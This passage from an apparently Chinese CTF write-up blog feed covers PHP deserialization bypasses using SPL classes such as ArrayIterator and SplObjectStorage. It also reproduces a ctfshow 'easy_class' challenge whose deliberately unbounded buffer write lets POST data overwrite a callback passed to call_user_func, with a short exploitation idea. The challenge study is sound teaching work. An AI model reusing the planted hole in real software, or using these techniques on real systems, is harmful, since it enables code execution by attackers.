/f*&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span>=<span class="keyword">array</span>(<span class="string">&quot;evil&quot;</span>=&gt;<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$oa</span>=<span class="keyword">new</span> <span class="built_in">ArrayIterator</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$oa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$res</span>;</span><br><span class="line"><span class="comment">//unserialize($res)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230404181631721.png" alt="image-20230404181631721"></p><p><strong>过所有测试发现可以用的类为：</strong></p><ul><li>ArrayObject::unserialize</li><li>ArrayIterator::unserialize</li><li>RecursiveArrayIterator::unserialize</li><li>SplObjectStorage::unserialize</li></ul><p>其中SplObjectStorage需要注意一下：</p><p><img src="../images/image-20230404181727382.png" alt="image-20230404181727382"></p><p>给加上一条就行</p><p>参考   ———&gt;    <a href="https://www.yuque.com/boogipop/tdotcs/hobe2yqmb3kgy1l8?singleDoc#">wp</a></p><h2 id="easy-class"><a href="#easy-class" class="headerlink" title="easy_class"></a>easy_class</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-03-27 10:30:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-03-28 09:28:35</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">ctfshow</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_OFFSET_1</span> = <span class="number">0x41</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_OFFSET_2</span> = <span class="number">0x7b</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_OFFSET_3</span> = <span class="number">0x5b</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_OFFSET_4</span> = <span class="number">0x60</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_OFFSET_5</span> = <span class="number">0x30</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_OFFSET_6</span> = <span class="number">0x5f</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_SIZE__</span>= <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_VAL_SIZE__</span>= <span class="number">50</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cursor</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cache</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$ref_table</span>=[];</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$flag</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">define</span>(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="built_in">self</span>::<span class="variable constant_">__REF_VAL_SIZE__</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">define</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="title function_ invoke__">strlen</span>(<span class="variable">$flag</span>));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">neaten</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fill</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="variable">$flag</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fill</span>(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="string">&#x27;ctfshow&#x27;</span>)===<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="string">&#x27;flag&#x27;</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">fill</span>(<span class="params"><span class="variable">$ref</span>,<span class="variable">$val</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">rewind</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">        <span class="title function_ invoke__">fseek</span>(<span class="variable">$this</span>-&gt;cache, <span class="variable">$this</span>-&gt;ref_table[<span class="variable">$ref</span>]+<span class="number">23</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="variable">$arr</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$val</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$s</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;cache, <span class="title function_ invoke__">pack</span>(<span class="string">&quot;C&quot;</span>,<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>)));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="title function_ invoke__">sizeof</span>(<span class="variable">$arr</span>); <span class="variable">$i</span> &lt; <span class="built_in">self</span>::<span class="variable constant_">__REF_VAL_SIZE__</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;cache, <span class="title function_ invoke__">pack</span>(<span class="string">&quot;C&quot;</span>,<span class="string">&quot;\x00&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cursor= <span class="title function_ invoke__">ftell</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">clear</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">        ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">neaten</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ref_table[<span class="string">&#x27;_clear_&#x27;</span>]=<span class="variable language_">$this</span>-&gt;cursor;</span><br><span class="line">        <span class="variable">$arr</span> = <span class="title function_ invoke__">str_split</span>(<span class="string">&quot;_clear_&quot;</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$s</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>),<span class="string">&quot;C&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="title function_ invoke__">sizeof</span>(<span class="variable">$arr</span>); <span class="variable">$i</span> &lt; <span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="string">&quot;\x00&quot;</span>,<span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arr</span> = <span class="title function_ invoke__">str_split</span>(<span class="keyword">__NAMESPACE__</span>.<span class="string">&quot;\C::clear&quot;</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$s</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>),<span class="string">&quot;C&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="number">0x36d</span>,<span class="string">&#x27;Q&#x27;</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="number">0x30</span>,<span class="string">&#x27;C&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">1</span>; <span class="variable">$i</span> &lt; <span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="string">&quot;\x00&quot;</span>,<span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">readNeaten</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">rewind</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">        <span class="title function_ invoke__">fseek</span>(<span class="variable">$this</span>-&gt;cache, <span class="variable">$this</span>-&gt;ref_table[<span class="string">&#x27;_clear_&#x27;</span>]+<span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>);</span><br><span class="line">        <span class="variable">$f</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">truncation</span>(<span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;cache, <span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>-<span class="number">4</span>));</span><br><span class="line">        <span class="variable">$t</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">truncation</span>(<span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;cache, <span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>-<span class="number">12</span>));</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">truncation</span>(<span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;cache, <span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>));</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$f</span>,<span class="variable">$p</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">define</span>(<span class="params"><span class="variable">$ref</span>,<span class="variable">$size</span></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkRef</span>(<span class="variable">$ref</span>);</span><br><span class="line">        <span class="variable">$r</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$ref</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ref_table[<span class="variable">$ref</span>]=<span class="variable language_">$this</span>-&gt;cursor;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$r</span> <span class="keyword">as</span> <span class="variable">$s</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>),<span class="string">&quot;C&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="title function_ invoke__">sizeof</span>(<span class="variable">$r</span>); <span class="variable">$i</span> &lt; <span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="string">&quot;\x00&quot;</span>,<span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;cache,<span class="title function_ invoke__">pack</span>(<span class="string">&quot;v&quot;</span>,<span class="variable">$size</span>));</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;cache,<span class="title function_ invoke__">pack</span>(<span class="string">&quot;C&quot;</span>,<span class="number">0x31</span>));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cursor= <span class="title function_ invoke__">ftell</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$size</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="string">&quot;\x00&quot;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$ref</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$ref</span>,<span class="variable">$this</span>-&gt;ref_table))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\Exception</span>(<span class="string">&quot;Ref not exists!&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;ref_table[<span class="variable">$ref</span>]!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">seekCursor</span>(<span class="variable">$this</span>-&gt;ref_table[<span class="variable">$ref</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">rewind</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$cref</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;cache, <span class="number">20</span>);</span><br><span class="line">        <span class="variable">$csize</span> = <span class="title function_ invoke__">unpack</span>(<span class="string">&quot;v&quot;</span>, <span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;cache, <span class="number">2</span>));</span><br><span class="line">        <span class="variable">$usize</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;cache, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$val</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;cache, <span class="variable">$csize</span>[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">truncation</span>(<span class="variable">$val</span>);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$val</span>,<span class="variable">$fmt</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;cache,<span class="title function_ invoke__">pack</span>(<span class="variable">$fmt</span>,<span class="variable">$val</span>));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cursor= <span class="title function_ invoke__">ftell</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">rewind</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">        <span class="title function_ invoke__">fseek</span>(<span class="variable">$this</span>-&gt;cache, <span class="variable">$this</span>-&gt;cursor);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">truncation</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">implode</span>(<span class="title function_ invoke__">array_filter</span>(<span class="title function_ invoke__">str_split</span>(<span class="variable">$data</span>),function(<span class="variable">$var</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$var</span>!==<span class="string">&quot;\x00&quot;</span>;</span><br><span class="line">        &#125;));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">seekCursor</span>(<span class="params"><span class="variable">$cursor</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">rewind</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">        <span class="title function_ invoke__">fseek</span>(<span class="variable">$this</span>-&gt;cache, <span class="variable">$cursor</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">checkRef</span>(<span class="params"><span class="variable">$ref</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$r</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$ref</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">sizeof</span>(<span class="variable">$r</span>)&gt;<span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\Exception</span>(<span class="string">&quot;Refenerce size too long!&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$r</span>[<span class="number">0</span>]) || <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkByte</span>(<span class="variable">$r</span>[<span class="number">0</span>]))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\Exception</span>(<span class="string">&quot;Ref invalid!&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">array_shift</span>(<span class="variable">$r</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$r</span> <span class="keyword">as</span> <span class="variable">$s</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkByte</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\Exception</span>(<span class="string">&quot;Ref invalid!&quot;</span>, <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">checkByte</span>(<span class="params"><span class="variable">$check</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$check</span>) &lt;=<span class="built_in">self</span>::<span class="variable constant_">__REF_OFFSET_5</span> || <span class="title function_ invoke__">ord</span>(<span class="variable">$check</span>) &gt;=<span class="built_in">self</span>::<span class="variable constant_">__REF_OFFSET_2</span> )&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$check</span>) &gt;=<span class="built_in">self</span>::<span class="variable constant_">__REF_OFFSET_3</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$check</span>) &lt;= <span class="built_in">self</span>::<span class="variable constant_">__REF_OFFSET_4</span> </span><br><span class="line">            &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$check</span>) !== <span class="built_in">self</span>::<span class="variable constant_">__REF_OFFSET_6</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cache=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;php://memory&quot;</span>,<span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">readNeaten</span>();</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> C;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">main</span>();</span><br></pre></td></tr></table></figure><p><strong>思路</strong></p><p>写入post值得时候没限制长度，所以可以覆盖后面的flag和<em>clear</em>存储的值，然后最后读<em>clear</em>时候调用了call_user_func</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow 愚人杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>杭师校赛决赛-web</title>
      <link href="/posts/a14faaa5.html"/>
      <url>/posts/a14faaa5.html</url>
      
